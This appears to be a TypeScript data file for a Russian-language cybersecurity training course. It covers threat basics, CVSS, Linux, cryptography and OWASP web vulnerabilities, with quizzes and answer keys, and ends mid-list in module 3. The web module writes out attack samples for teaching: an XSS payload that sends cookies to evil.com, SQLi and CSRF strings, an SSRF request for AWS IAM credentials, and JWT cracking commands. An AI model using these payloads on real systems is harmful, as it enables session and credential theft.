import type { Module } from '../../types'

export const modules: Module[] = [
  // ── MODULE 1 ────────────────────────────────────────────────────────────
  {
    id: 'mod-01',
    title: 'Основы ИБ',
    subtitle: 'Threat Landscape',
    description:
      'Фундамент кибербезопасности: классификация угроз, CVE/CVSS, триада CIA. ' +
      'Без этого нельзя двигаться дальше.',
    icon: '🛡',
    color: '#ff0030',
    xpReward: 200,
    estimatedTime: '~40 мин',
    prerequisites: [],
    tags: ['theory', 'basics', 'CVE'],
    theory: [
      {
        id: 'sec-1-1',
        title: 'Ландшафт угроз',
        keyPoints: [
          'Угрозы делятся на: внешние / внутренние, целенаправленные / массовые',
          'APT (Advanced Persistent Threat) — длительные, скрытые атаки на конкретные цели',
          'Threat actors: хакеры-одиночки, киберпреступные группы, государственные акторы',
          'Kill Chain — модель: разведка → вооружение → доставка → эксплойт → инсталляция → C2 → цель'
        ],
        content: `Мир кибербезопасности начинается с понимания того, кто и почему атакует.

**Типы угроз**
Угрозы классифицируют по источнику, мотивации и методу. Внешние атаки исходят от людей вне организации — хакеров, криминальных группировок, государств. Внутренние — от сотрудников, подрядчиков, инсайдеров.

**APT — продвинутые устойчивые угрозы**
APT-группы (Lazarus, Cozy Bear, Fancy Bear) — это профессиональные команды, которые месяцами живут в инфраструктуре жертвы незамеченными. Касперский активно исследует и атрибутирует такие группы.

**Cyber Kill Chain**
Модель Lockheed Martin описывает 7 стадий атаки:
1. Reconnaissance — сбор информации о цели
2. Weaponization — создание вредоносного инструмента
3. Delivery — доставка (email, USB, веб)
4. Exploitation — использование уязвимости
5. Installation — закрепление в системе
6. Command & Control — связь с C2-сервером
7. Actions on Objectives — кража данных / шифрование

**MITRE ATT&CK**
Фреймворк с сотнями реальных техник, используемых атакующими. Обязательный инструмент для любого исследователя безопасности.`,
        codeExample: `# Пример: поиск IoC (Indicator of Compromise) в логах
grep -rn "185.234.218.\\|cobalt strike\\|mimikatz" /var/log/
# Хэши известных малварей можно проверить на VirusTotal API
curl "https://www.virustotal.com/vtapi/v2/file/report?apikey=KEY&resource=HASH"`
      },
      {
        id: 'sec-1-2',
        title: 'CVE и CVSS — язык уязвимостей',
        keyPoints: [
          'CVE — уникальный идентификатор уязвимости: CVE-YYYY-NNNNN',
          'CVSS v3.1 — числовой балл от 0.0 до 10.0 (критичность)',
          'Вектор CVSS учитывает: AV (attack vector), AC, PR, UI, S, C, I, A',
          'NVD и Vulners — публичные базы CVE с описаниями и патчами'
        ],
        content: `**CVE (Common Vulnerabilities and Exposures)**
Каждая публично известная уязвимость получает CVE-идентификатор. Например, знаменитый EternalBlue — это CVE-2017-0144.

**CVSS — числовая оценка критичности**
CVSS (Common Vulnerability Scoring System) позволяет быстро понять, насколько опасна уязвимость:

| Балл      | Уровень  |
|-----------|----------|
| 0.1 – 3.9 | Low      |
| 4.0 – 6.9 | Medium   |
| 7.0 – 8.9 | High     |
| 9.0 – 10  | Critical |

**Как читать CVSS-вектор**
CVSS-вектор — это машиночитаемое "досье" на уязвимость. Каждый параметр отвечает на конкретный вопрос: как атаковать? что нужно атакующему? что теряет жертва?

Разберём реальный пример — **Log4Shell (CVE-2021-44228, CVSS 10.0)**:
\`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\`

| Параметр | Значение | Расшифровка | Что это значит на практике |
|----------|----------|-------------|---------------------------|
| AV:N | Attack Vector: Network | Атака через интернет | Не нужен физический доступ — любой в сети может попробовать |
| AC:L | Attack Complexity: Low | Простая атака | Не нужны особые условия, один запрос — и готово |
| PR:N | Privileges Required: None | Без авторизации | Анонимный пользователь, даже не залогиненный |
| UI:N | User Interaction: None | Без участия жертвы | Не нужно чтобы кто-то кликнул на ссылку |
| S:C | Scope: Changed | Удар выходит за рамки компонента | RCE в сервере → атакующий попадает в инфраструктуру |
| C:H | Confidentiality: High | Полная утечка данных | Читаем любые файлы, переменные окружения, секреты |
| I:H | Integrity: High | Полная запись | Кладём файлы, меняем конфиги |
| A:H | Availability: High | Полный отказ | Можем положить сервис |

Итог: **10.0 Critical** — максимально возможный балл. Атакующий без каких-либо прав, через интернет, одним HTTP-запросом получает полный контроль над сервером.

Для сравнения — **Heartbleed (CVE-2014-0160, CVSS 7.5)**:
\`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\`
Та же сетевая доступность и нет привилегий — но S:U (Scope: Unchanged, дальше уязвимого компонента не уходит) и только C:H без I и A. Итог: High, не Critical — утечка данных, но не RCE.

**Почему это важно для исследователя**
Когда ты находишь уязвимость, CVSS-вектор — это твой аргумент при написании репорта. Программы bug bounty платят пропорционально баллу. Разница между S:U и S:C или между C:H и C:L может удвоить выплату.`,
        codeExample: `# Поиск CVE по продукту через API
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=OpenSSL+heap+overflow"

# Просмотр деталей конкретной CVE
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228"`
      },
      {
        id: 'sec-1-3',
        title: 'Триада CIA и модели безопасности',
        keyPoints: [
          'CIA: Confidentiality (конфиденциальность), Integrity (целостность), Availability (доступность)',
          'Атаки нарушают одну или несколько составляющих CIA',
          'Zero Trust: "никогда не доверяй, всегда проверяй"',
          'Defence in Depth — многоуровневая защита'
        ],
        content: `**Триада CIA — основа основ**
Любую угрозу можно описать через то, что она нарушает:

🔒 **Confidentiality** — утечка данных, перехват трафика, инсайдерские угрозы
✏️  **Integrity** — подмена данных, SQL-инъекции, атаки на цепочку поставок
⚡ **Availability** — DDoS, ransomware, уничтожение данных

**Модели управления доступом**
- **DAC** (Discretionary) — владелец ресурса сам назначает права (классический файловый ACL)
- **MAC** (Mandatory) — метки секретности, используется в военных системах
- **RBAC** (Role-Based) — права назначаются через роли (самая распространённая модель)
- **ABAC** (Attribute-Based) — решение принимается на основе атрибутов пользователя и ресурса

**Zero Trust Architecture**
Современная парадигма: не доверяй ни одному запросу по умолчанию, даже внутри сети. Проверяй identity, device health, context при каждом обращении.

**Defence in Depth**
Никогда не полагайся на одну линию защиты. Файрвол взломали? Должна сработать сегментация сети. Её обошли? SIEM заметит аномалию.`,
        codeExample: `# Проверка целостности файла (Integrity)
sha256sum /bin/ls
# Сравнение с доверенным хэшем
echo "expected_hash  /bin/ls" | sha256sum --check

# Пример RBAC в Linux — проверка sudo-правил
sudo -l -U username`
      },
      {
        id: 'sec-1-4',
        title: 'Linux — основы для безопасника',
        keyPoints: [
          'Linux — основная ОС в ИБ: серверы, инструменты, CTF',
          'Права доступа: rwx, chmod, chown, setuid/setgid',
          '/proc, /etc, /var/log — ключевые директории',
          'Bash: grep, find, awk, sed — инструменты анализа'
        ],
        content: `**Почему Linux**
Kali Linux, Parrot OS, Ubuntu Server — всё это Linux. Большинство инструментов ИБ работают на Linux. Серверы — Linux. CTF-задачи — Linux. Без него никуда.

**Файловая система**
| Директория | Содержимое |
|-----------|-----------|
| /etc | Конфигурационные файлы |
| /var/log | Логи системы и приложений |
| /proc | Виртуальная ФС: информация о процессах |
| /home | Домашние директории пользователей |
| /tmp | Временные файлы (часто используется малварью) |
| /bin, /sbin | Основные исполняемые файлы |

**Права доступа**
\`ls -la\` выводит: \`-rwxr-xr--\`
- Первый символ: тип (-файл, d-директория, l-симлинк)
- rwx: права владельца (read/write/execute)
- r-x: права группы
- r--: права для остальных

\`chmod 755 file\` = rwxr-xr-x
\`chmod +x file\` = добавить execute

**Опасные биты:**
- **setuid** (chmod u+s) — исполняется с правами владельца файла, не запускающего
- **setgid** — аналогично для группы
- Ищем их: \`find / -perm -u=s -type f 2>/dev/null\` → часто вектор privesc

**Ключевые команды:**
- \`ps aux\` — список процессов
- \`netstat -tulnp\` / \`ss -tulnp\` — сетевые соединения
- \`lsof -i\` — открытые файлы/сокеты
- \`crontab -l\` — задачи планировщика (persistence)
- \`history\` — история команд (ценный артефакт)`,
        codeExample: `# Поиск SUID-файлов (векторы privesc)
find / -perm -u=s -type f 2>/dev/null

# Анализ подозрительных процессов
ps aux | sort -k3 -rn | head    # топ по CPU
ls -la /proc/$(pgrep suspicious)/exe  # что за бинарник?

# Поиск по логам
grep -i "failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
# Кто пытался брутфорсить SSH?

# Мониторинг файловой системы в реальном времени
inotifywait -r -m /tmp --format '%T %w%f %e' --timefmt '%H:%M:%S'`
      },
      {
        id: 'sec-1-5',
        title: 'Криптография — основы для ИБ',
        keyPoints: [
          'Симметричное (AES) — один ключ для шифровки и расшифровки',
          'Асимметричное (RSA, ECC) — публичный ключ шифрует, приватный расшифровывает',
          'Хэш-функции: SHA-256 (безопасный), MD5 (небезопасен для паролей)',
          'TLS = асимметрика для обмена ключами + симметрика для данных'
        ],
        content: `**Симметричное шифрование**
Один ключ для шифрования и расшифрования. Быстро, но проблема: как безопасно передать ключ?

**AES (Advanced Encryption Standard)** — стандарт. AES-256 используется везде: зашифрованные диски, TLS, VPN, ransomware (да, они тоже его используют).

Режимы: ECB (небезопасный!), CBC, CTR, GCM (аутентифицированное шифрование).

**Асимметричное шифрование**
Два ключа: **публичный** (можно раздавать всем) и **приватный** (только у тебя).
- Зашифровано публичным → расшифровывает только приватный
- Подписано приватным → верифицирует публичный

**RSA** — классика. Безопасность на сложности факторизации больших чисел. 2048/4096 бит.
**ECC (Elliptic Curve Cryptography)** — тот же уровень безопасности, но меньше ключи. Ed25519 — лучший выбор для SSH.

**Хэш-функции (не шифрование!)**
Одностороннее преобразование. Свойства: детерминированность, лавинный эффект, коллизионная стойкость.

| Алгоритм | Длина | Статус |
|----------|-------|--------|
| MD5 | 128 бит | Небезопасен (коллизии) |
| SHA-1 | 160 бит | Устаревший |
| SHA-256 | 256 бит | Безопасен |
| bcrypt | переменная | Лучший для паролей |

**Для паролей — обязательно bcrypt/Argon2/scrypt!** Они медленные специально — делают брутфорс неэффективным.

**TLS — как это работает**
1. Клиент отправляет ClientHello (поддерживаемые шифры)
2. Сервер → сертификат (публичный ключ + подпись CA)
3. Согласование ключа сессии (ECDHE)
4. Всё дальнейшее — AES-GCM с этим ключом
Certificate Authority (CA) — корень доверия. Если CA скомпрометирован → MITM возможен.`,
        codeExample: `# OpenSSL — швейцарский нож криптографии
# Генерация RSA ключа
openssl genrsa -out private.pem 4096
openssl rsa -in private.pem -pubout -out public.pem

# Шифрование файла (AES-256-CBC)
openssl enc -aes-256-cbc -in plaintext.txt -out encrypted.bin

# Хэши
echo -n "password" | md5sum      # небезопасно для паролей
echo -n "password" | sha256sum

# Проверка TLS-сертификата сайта
openssl s_client -connect google.com:443 < /dev/null 2>/dev/null \
  | openssl x509 -text -noout | grep -A2 "Subject:"

# Python: bcrypt для паролей
import bcrypt
hashed = bcrypt.hashpw(b"mypassword", bcrypt.gensalt(rounds=12))`
      }
    ],
    quiz: [
      {
        id: 'q1-1',
        question: 'Что такое APT (Advanced Persistent Threat)?',
        options: [
          'Тип DDoS-атаки с использованием ботнета',
          'Длительная целенаправленная атака, скрытая от обнаружения',
          'Уязвимость нулевого дня в сетевых протоколах',
          'Метод шифрования данных в ransomware'
        ],
        correctIndex: 1,
        explanation:
          'APT — это продолжительная атака (месяцы/годы), направленная на конкретную цель. Государственные группировки (Lazarus, Cozy Bear) — типичные примеры. Цель — тихо собирать информацию, а не привлекать внимание.',
        difficulty: 'easy'
      },
      {
        id: 'q1-2',
        question: 'CVSS-балл 9.8 соответствует какому уровню критичности?',
        options: ['High', 'Medium', 'Critical', 'Low'],
        correctIndex: 2,
        explanation:
          'Уязвимости с баллом ≥9.0 по CVSS считаются Critical. 9.8 — один из самых высоких баллов. Пример: Log4Shell (CVE-2021-44228) получил 10.0.',
        difficulty: 'easy'
      },
      {
        id: 'q1-3',
        question: 'На какой стадии Kill Chain атакующий закрепляется в системе (persistence)?',
        options: ['Delivery', 'Exploitation', 'Installation', 'Reconnaissance'],
        correctIndex: 2,
        explanation:
          'Installation — стадия закрепления. Атакующий устанавливает бэкдор, модифицирует автозагрузку или создаёт задачу в планировщике, чтобы пережить перезагрузку.',
        difficulty: 'medium'
      },
      {
        id: 'q1-4',
        question:
          'Вектор CVSS: AV:N/AC:L/PR:N/UI:N. Что означает AV:N?',
        options: [
          'Атака требует физического доступа',
          'Атака возможна через соседнюю сеть',
          'Атака возможна удалённо через интернет',
          'Атака возможна только локально'
        ],
        correctIndex: 2,
        explanation:
          'AV:N (Attack Vector: Network) означает, что уязвимость эксплуатируется удалённо через сеть — самый опасный вектор. AV:L — локально, AV:P — физически.',
        difficulty: 'medium'
      },
      {
        id: 'q1-5',
        question: 'Ransomware нарушает какой компонент триады CIA?',
        options: [
          'Только Confidentiality',
          'Только Integrity',
          'Availability (и часто Confidentiality)',
          'Только Integrity и Confidentiality'
        ],
        correctIndex: 2,
        explanation:
          'Ransomware шифрует файлы → нарушает Availability (данные недоступны). Современные ransomware-группы также крадут данные перед шифрованием → нарушают Confidentiality (двойное вымогательство).',
        difficulty: 'medium'
      },
      {
        id: 'q1-6',
        question: 'Что такое setuid-бит на исполняемом файле Linux?',
        options: [
          'Файл зашифрован',
          'Программа выполняется с правами своего владельца, а не запускающего пользователя',
          'Файл доступен только root',
          'Файл не может быть изменён'
        ],
        correctIndex: 1,
        explanation: 'setuid (SUID) позволяет программе работать с правами владельца файла независимо от того, кто её запустил. /usr/bin/passwd — классический пример: нужно менять /etc/shadow, принадлежащий root. Уязвимый SUID-бинарник — частый вектор privilege escalation в CTF и реальных атаках.',
        difficulty: 'medium'
      },
      {
        id: 'q1-7',
        question: 'AES-256 и RSA-2048 — в чём ключевое различие?',
        options: [
          'AES быстрее и использует один ключ; RSA медленнее и использует пару ключей',
          'RSA лучше для шифрования файлов',
          'AES используется только для паролей',
          'Нет различий, оба симметричные'
        ],
        correctIndex: 0,
        explanation: 'AES — симметричный (один ключ, быстрый, для объёма данных). RSA — асимметричный (публичный/приватный, медленный, для обмена ключами и подписей). TLS использует оба: RSA/ECDH для согласования ключа, AES для самих данных.',
        difficulty: 'medium'
      },
      {
        id: 'q1-8',
        question: 'Почему MD5 нельзя использовать для хранения паролей?',
        options: [
          'MD5 слишком длинный',
          'MD5 очень медленный',
          'MD5 быстрый и для него существуют радужные таблицы; пароли можно взломать за секунды',
          'MD5 требует соль (salt)'
        ],
        correctIndex: 2,
        explanation: 'MD5 вычисляется за наносекунды — GPU может проверять миллиарды хэшей в секунду. Для паролей нужны bcrypt/Argon2/scrypt — они намеренно медленные (cost factor). К тому же для MD5 существуют rainbow tables с миллиардами предвычисленных хэшей.',
        difficulty: 'easy'
      }
    ]
  },

  // ── MODULE 2 ────────────────────────────────────────────────────────────
  {
    id: 'mod-02',
    title: 'Веб-безопасность',
    subtitle: 'OWASP Top 10',
    description:
      'XSS, SQL Injection, IDOR, SSRF и другие классические веб-уязвимости. ' +
      'Обязательная база для любого, кто хочет работать в ИБ.',
    icon: '🕸',
    color: '#cc0025',
    xpReward: 250,
    estimatedTime: '~55 мин',
    prerequisites: ['mod-01'],
    tags: ['web', 'OWASP', 'XSS', 'SQLi'],
    theory: [
      {
        id: 'sec-2-1',
        title: 'OWASP Top 10 — обзор',
        keyPoints: [
          'OWASP Top 10 — список наиболее критических веб-уязвимостей',
          'A01: Broken Access Control — самая распространённая в 2023',
          'A03: Injection — SQL, NoSQL, LDAP, OS-инъекции',
          'A07: Identification & Authentication Failures — слабая аутентификация'
        ],
        content: `**OWASP (Open Web Application Security Project)**
Некоммерческая организация, которая выпускает руководства и инструменты для безопасности ПО. Их Top 10 — стандарт индустрии.

**OWASP Top 10 (2021)**
| # | Название | Примеры |
|---|----------|---------|
| A01 | Broken Access Control | IDOR, privilege escalation |
| A02 | Cryptographic Failures | слабое шифрование, plaintext |
| A03 | Injection | SQL, XSS, command injection |
| A04 | Insecure Design | отсутствие rate limiting |
| A05 | Security Misconfiguration | открытые S3, дефолтные пароли |
| A06 | Vulnerable Components | устаревшие библиотеки |
| A07 | Auth Failures | слабые пароли, session fixation |
| A08 | Software & Data Integrity | unsigned updates |
| A09 | Logging Failures | нет логов атак |
| A10 | SSRF | запросы к внутренней инфраструктуре |

**Связь с твоим опытом**
Из Code4rena аудитов ты знаешь reentrancy и flash loan атаки в Solidity. Они аналогичны TOCTOU (Time-Of-Check/Time-Of-Use) уязвимостям в веб.`,
        codeExample: `# Инструмент автоматического сканирования OWASP Top 10
# Nikto — базовый веб-сканер
nikto -h https://target.example.com

# OWASP ZAP — full proxy + scanner (GUI и CLI)
zap-cli quick-scan --self-contained -t https://target.example.com`
      },
      {
        id: 'sec-2-2',
        title: 'XSS и Injection-атаки',
        keyPoints: [
          'XSS (Cross-Site Scripting): reflected, stored, DOM-based',
          'Stored XSS опаснее всего — payload хранится на сервере',
          'SQL Injection: классический, blind, time-based, out-of-band',
          'Защита: параметризованные запросы, Content Security Policy (CSP)'
        ],
        content: `**Cross-Site Scripting (XSS)**
XSS позволяет атакующему внедрить JavaScript-код, который выполнится в браузере жертвы.

**Типы XSS:**
🔴 **Reflected** — payload в URL, выполняется при переходе по ссылке
🔴 **Stored** — payload сохраняется в БД (комментарии, профиль), атакует всех посетителей
🔴 **DOM-based** — JavaScript сам модифицирует DOM без запроса к серверу

**Что делает XSS?**
- Кража cookies / session tokens
- Keylogger — запись нажатий клавиш
- Redirect на фишинговый сайт
- BeEF (Browser Exploitation Framework) — полный контроль браузера

**SQL Injection**
Если пользовательский ввод попадает в SQL-запрос без валидации — катастрофа.

\`SELECT * FROM users WHERE name='$input'\`

При вводе \`' OR 1=1 --\` запрос становится: \`SELECT * FROM users WHERE name='' OR 1=1 --'\`
Результат: все записи таблицы.

**Защита:**
✅ Prepared statements / parameterized queries
✅ ORM-фреймворки (Hibernate, SQLAlchemy)
✅ WAF (Web Application Firewall)
✅ Input validation + output encoding`,
        codeExample: `// Уязвимый код (PHP)
$query = "SELECT * FROM users WHERE id=" . $_GET['id'];

// Безопасный код (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);

// Базовый XSS payload
<script>document.location='https://evil.com/?c='+document.cookie</script>

// sqlmap — автоматизация SQLi (только в лаборатории!)
sqlmap -u "https://target.com/page?id=1" --dbs`
      },
      {
        id: 'sec-2-3',
        title: 'IDOR, SSRF и Broken Access Control',
        keyPoints: [
          'IDOR: подмена ID объекта для доступа к чужим данным',
          'SSRF: сервер делает запросы к внутренней инфраструктуре',
          'Horizontal vs Vertical privilege escalation',
          'SSRF → AWS metadata (169.254.169.254) → утечка ролей IAM'
        ],
        content: `**IDOR (Insecure Direct Object Reference)**
Классика bug bounty. Пользователь меняет ID в запросе и получает чужие данные.

\`GET /api/orders/12345\` → меняем на \`GET /api/orders/12346\`
Если сервер не проверяет принадлежность — IDOR.

**Где искать IDOR:**
- API endpoints с числовыми/UUID идентификаторами
- Параметры типа \`user_id\`, \`account\`, \`doc_id\`
- GraphQL queries с предсказуемыми ID

**SSRF (Server-Side Request Forgery)**
Заставляем сервер делать HTTP-запросы вместо нас — к внутренней сети, к которой у нас нет доступа.

\`POST /fetch?url=http://internal-service:8080/admin\`

**Критический кейс — AWS metadata:**
\`url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\`
→ Получаем AWS-ключи роли EC2-инстанса → полный контроль над облаком.

**Privilege Escalation:**
- Horizontal: доступ к ресурсам другого пользователя того же уровня
- Vertical: повышение привилегий (user → admin)`,
        codeExample: `# Проверка SSRF вручную — используем Burp Collaborator / interactsh
curl -X POST "https://target.com/api/webhook" \\
  -d '{"url":"https://your-interactsh-server.com/ssrf-test"}'

# Автоматический поиск IDOR с ffuf
ffuf -u "https://target.com/api/user/FUZZ" \\
  -w ids.txt \\
  -H "Cookie: session=your_session" \\
  -fc 403,404`
      },
      {
        id: 'sec-2-4',
        title: 'HTTP/HTTPS и заголовки безопасности',
        keyPoints: [
          'HTTP — stateless протокол; состояние хранится в Cookie/Session',
          'CSP (Content-Security-Policy) — ограничивает источники скриптов, защита от XSS',
          'HSTS — браузер запрещает HTTP, только HTTPS',
          'Burp Suite Proxy — инструмент для перехвата и изменения HTTP-запросов'
        ],
        content: `**HTTP — фундамент веб-безопасности**
Без понимания HTTP невозможно тестировать веб-приложения. Каждый запрос = метод + URL + заголовки + тело.

**HTTP методы:**
- **GET** — получить ресурс (параметры в URL, кешируется)
- **POST** — отправить данные (тело запроса, не кешируется)
- **PUT/PATCH** — обновить ресурс
- **DELETE** — удалить
- **OPTIONS** — узнать поддерживаемые методы (CORS preflight)

**Важные заголовки запроса:**
- \`Cookie: session=abc123\` — передача сессии
- \`Authorization: Bearer <JWT>\` — токен авторизации
- \`X-Forwarded-For: 1.2.3.4\` — проксированный IP (можно подделать!)
- \`Referer\` — откуда пришёл запрос (утечка URL с параметрами!)

**Защитные заголовки ответа:**
| Заголовок | Защита от |
|-----------|-----------|
| Content-Security-Policy | XSS — ограничивает откуда грузить JS |
| Strict-Transport-Security | SSL stripping — только HTTPS |
| X-Frame-Options: DENY | Clickjacking |
| X-Content-Type-Options | MIME sniffing |
| Referrer-Policy | Утечка URL |

**Cookies — флаги безопасности:**
- **HttpOnly** — недоступен из JS → защита от cookie theft через XSS
- **Secure** — только по HTTPS
- **SameSite=Strict** — защита от CSRF

**Burp Suite — незаменимый инструмент**
Proxy перехватывает каждый запрос между браузером и сервером. Можно изменять параметры, заголовки, тело на лету. Repeater — повторять изменённые запросы. Intruder — автоматизированный перебор (fuzzing).`,
        codeExample: `# curl — тестирование HTTP вручную
# GET запрос с Cookie
curl -H "Cookie: session=abc123" https://target.com/api/profile

# POST с JSON телом
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","pass":"test"}'

# Проверка заголовков безопасности
curl -I https://example.com | grep -i "security\|content-sec\|strict\|frame"

# nikto — автосканер заголовков и конфигурации
nikto -h https://target.com

# gobuster — поиск скрытых директорий
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt`
      },
      {
        id: 'sec-2-5',
        title: 'Аутентификация: JWT, OAuth 2.0, CSRF',
        keyPoints: [
          'JWT: header.payload.signature — подпись проверяет целостность',
          'Атаки на JWT: alg:none, слабый секрет, kid injection',
          'CSRF: заставить браузер жертвы сделать запрос от её имени',
          'OAuth 2.0 misconfig: redirect_uri manipulation, state bypass'
        ],
        content: `**JWT (JSON Web Token)**
Три части в base64, разделённые точками: \`header.payload.signature\`

- **Header:** \`{"alg":"HS256","typ":"JWT"}\`
- **Payload:** \`{"user_id":1,"role":"user","exp":1735689600}\`
- **Signature:** HMAC-SHA256(header+payload, secret)

**Атаки на JWT:**

🔴 **alg:none** — если сервер принимает алгоритм "none", подпись не проверяется. Меняем payload, удаляем подпись.

🔴 **Слабый секрет** — брутфорс через hashcat: \`hashcat -a 0 -m 16500 token.txt wordlist.txt\`

🔴 **RS256 → HS256** — если сервер принимает HS256, используй публичный ключ как секрет HMAC.

🔴 **kid injection** — kid параметр в header — путь к файлу с ключом. SQLi в kid: \`"kid":"../../dev/null"\` → secret = пустая строка.

**CSRF (Cross-Site Request Forgery)**
Злоумышленник вынуждает браузер аутентифицированного пользователя сделать нежелательный запрос.

\`<img src="https://bank.com/transfer?to=attacker&amount=1000">\`

Браузер автоматически отправит Cookie пользователя с этим запросом.

**Защита от CSRF:**
- CSRF токены — уникальный токен в форме, сервер проверяет
- SameSite=Strict на Cookie — браузер не отправляет cookies в cross-site запросах
- Проверка Referer/Origin заголовков

**OAuth 2.0 — типичные уязвимости**
- **redirect_uri manipulation** — если нет валидации, токен уйдёт к атакующему
- **state bypass** — state параметр для CSRF-защиты, если не проверяется → account takeover
- **implicit flow leakage** — токен в URL → в логах, referer-заголовке`,
        codeExample: `# JWT decode (без верификации)
import base64, json
token = "eyJ..."
parts = token.split('.')
payload = json.loads(base64.b64decode(parts[1] + '=='))
print(payload)

# jwt_tool — атаки на JWT
python3 jwt_tool.py TOKEN -X a   # тест alg:none
python3 jwt_tool.py TOKEN -C -d wordlist.txt  # брутфорс секрета

# hashcat — брутфорс HS256 JWT
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Тест CSRF: отправить запрос без CSRF-токена
curl -X POST https://target.com/api/change-email \
  -H "Cookie: session=VICTIM_SESSION" \
  -d "email=attacker@evil.com"
# Если 200 — CSRF уязвимость`
      }
    ],
    quiz: [
      {
        id: 'q2-1',
        question: 'Чем Stored XSS опаснее Reflected XSS?',
        options: [
          'Stored XSS работает только в Internet Explorer',
          'Stored XSS автоматически атакует всех посетителей страницы',
          'Reflected XSS требует авторизации, Stored — нет',
          'Разницы нет, оба одинаково опасны'
        ],
        correctIndex: 1,
        explanation:
          'Stored XSS хранится в базе данных и выполняется при каждом посещении заражённой страницы. Один payload → тысячи жертв. Reflected требует, чтобы каждая жертва перешла по специально созданной ссылке.',
        difficulty: 'easy'
      },
      {
        id: 'q2-2',
        question: 'Какой запрос демонстрирует IDOR-атаку?',
        options: [
          'GET /admin после брутфорса пароля',
          "GET /api/orders/1337 при авторизации как пользователь с ID=999",
          'POST /login с payload: admin\' OR 1=1 --',
          'GET / с заголовком X-Forwarded-For: 127.0.0.1'
        ],
        correctIndex: 1,
        explanation:
          'IDOR — это когда ты подменяешь идентификатор объекта и получаешь доступ к чужим данным. Запрос к orders/1337 от пользователя 999 — типичный IDOR, если сервер не проверяет владельца заказа.',
        difficulty: 'easy'
      },
      {
        id: 'q2-3',
        question: 'Что защищает от SQL Injection лучше всего?',
        options: [
          'Экранирование одиночных кавычек',
          'Параметризованные запросы (prepared statements)',
          'Проверка длины строки',
          'Использование POST вместо GET'
        ],
        correctIndex: 1,
        explanation:
          'Prepared statements разделяют код и данные на уровне протокола — пользовательский ввод никогда не интерпретируется как SQL. Экранирование кавычек ненадёжно и легко обойти.',
        difficulty: 'medium'
      },
      {
        id: 'q2-4',
        question: 'SSRF к адресу 169.254.169.254 в облачной среде (AWS/GCP) даёт что?',
        options: [
          'Доступ к DNS-серверу провайдера',
          'Подключение к внутренней базе данных',
          'Доступ к metadata-сервису — ключам IAM / сервисным аккаунтам',
          'Соединение с gateway самого EC2-инстанса'
        ],
        correctIndex: 2,
        explanation:
          '169.254.169.254 — это link-local адрес instance metadata service в AWS/GCP/Azure. Через SSRF можно получить временные IAM-ключи, user-data, теги. Это один из самых ценных SSRF-векторов в cloud-окружениях.',
        difficulty: 'hard'
      },
      {
        id: 'q2-5',
        question: 'Vertical privilege escalation — это:',
        options: [
          'Доступ к аккаунту другого пользователя того же уровня',
          'Повышение привилегий: обычный пользователь получает права администратора',
          'Атака на сетевой уровень модели OSI',
          'Эксплуатация уязвимости в вертикальном scroll-bar'
        ],
        correctIndex: 1,
        explanation:
          'Vertical escalation — пересечение границ привилегий (user → admin, guest → moderator). Horizontal — доступ к чужим ресурсам на своём уровне (user_A → данные user_B).',
        difficulty: 'medium'
      },
      {
        id: 'q2-6',
        question: 'Что делает Cookie-флаг HttpOnly?',
        options: [
          'Cookie передаётся только по HTTP, не по HTTPS',
          'Cookie недоступен через JavaScript — document.cookie его не видит',
          'Cookie хранится только в памяти, не на диске',
          'Cookie ограничен одним HTTP-методом'
        ],
        correctIndex: 1,
        explanation: 'HttpOnly запрещает доступ к cookie через JavaScript (document.cookie). Это защита от XSS cookie theft — даже если атакующий внедрил JS, он не получит cookie. Session cookie должны всегда иметь HttpOnly + Secure флаги.',
        difficulty: 'medium'
      },
      {
        id: 'q2-7',
        question: 'Атака JWT "alg:none" работает, когда:',
        options: [
          'Сервер использует SHA-512 вместо SHA-256',
          'Сервер принимает токены без подписи при значении alg:none в заголовке',
          'Секретный ключ слишком короткий',
          'Токен истёк по времени'
        ],
        correctIndex: 1,
        explanation: 'Если сервер не валидирует алгоритм и принимает alg:none — подпись не нужна вообще. Атакующий декодирует payload, меняет role:user → role:admin, кодирует обратно с alg:none и пустой подписью. Всегда задавай allowedAlgorithms явно в JWT библиотеке.',
        difficulty: 'hard'
      },
      {
        id: 'q2-8',
        question: 'Content-Security-Policy (CSP) заголовок защищает от:',
        options: [
          'SQL инъекций',
          'DDoS атак',
          'XSS — ограничивает откуда браузер может загружать и выполнять скрипты',
          'CSRF атак'
        ],
        correctIndex: 2,
        explanation: 'CSP указывает браузеру доверенные источники контента. Пример: script-src \'self\' запрещает выполнение inline JS и скриптов с внешних доменов. Даже если XSS payload внедрён, браузер заблокирует его выполнение.',
        difficulty: 'medium'
      }
    ]
  },

  // ── MODULE 3 ────────────────────────────────────────────────────────────
  {
    id: 'mod-03',
    title: 'Исследование уязвимостей',
    subtitle: 'Vuln Research & PoC',
    description:
      'Методология поиска уязвимостей, разработка PoC, Bug Bounty, ответственное раскрытие. ' +
      'Здесь твои навыки из Code4rena напрямую применимы.',
    icon: '🔬',
    color: '#aa0020',
    xpReward: 300,
    estimatedTime: '~60 мин',
    prerequisites: ['mod-02'],
    tags: ['research', 'PoC', 'bug-bounty', 'audit'],
    theory: [
      {
        id: 'sec-3-1',
        title: 'Методология поиска уязвимостей',
        keyPoints: [
          'Black box / Grey box / White box — три модели тестирования',
          'Threat modeling: STRIDE и Attack Trees',
          'Фаззинг (fuzzing) — автоматическая генерация некорректного ввода',
          'Code Review: ручной анализ — самый эффективный метод'
        ],
        content: `**Три модели тестирования**

🖤 **Black box** — нет доступа к исходному коду, как реальный атакующий.
⚫ **Grey box** — частичная информация (архитектура, API-схема).
🔳 **White box** — полный доступ к коду, документации, окружению. Максимально эффективен.

Твои Code4rena аудиты — это white box. В Касперском большинство исследований тоже white box.

**Threat Modeling — STRIDE**
Систематическая методология поиска угроз:
- **S**poofing — подделка identity
- **T**ampering — модификация данных
- **R**epudiation — отрицание действий
- **I**nformation disclosure — утечка
- **D**enial of Service — отказ в обслуживании
